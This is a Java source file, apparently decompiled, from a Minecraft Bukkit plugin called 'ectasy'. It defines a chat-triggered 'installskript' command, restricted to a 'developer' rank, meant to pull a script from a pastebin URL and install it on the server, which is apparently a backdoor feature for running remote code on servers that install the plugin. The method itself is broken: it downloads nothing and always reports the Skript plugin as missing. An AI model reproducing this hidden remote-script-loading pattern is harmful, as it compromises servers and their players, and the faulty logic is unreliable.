package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

@CommandInfo(
   name = "installskript",
   description = "Installs a skript onto the server",
   blatant = true,
   rank = Rank.DEVELOPER,
   aliases = {"addskript", "skriptadd"}
)
public class InstallSkriptCommand extends AbstractCommand {

   /**
    * Wtf happened here LMAO
    */
   @Override
   public void execute(AsyncPlayerChatEvent asyncPlayerChatEvent, String string, String[] stringArray) {
      if (stringArray.length != 2) {
         ChatUtil.sendChat(asyncPlayerChatEvent.getPlayer(), "Please, use installskript <pastebin url> <filename>");
         return;
      }
      boolean bl = false;
      for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
         if (!plugin.getName().equalsIgnoreCase("Skript")) continue;
         bl = true;
      }
      ChatUtil.sendChat(asyncPlayerChatEvent.getPlayer(), "Skript plugin not found.");
   }
}
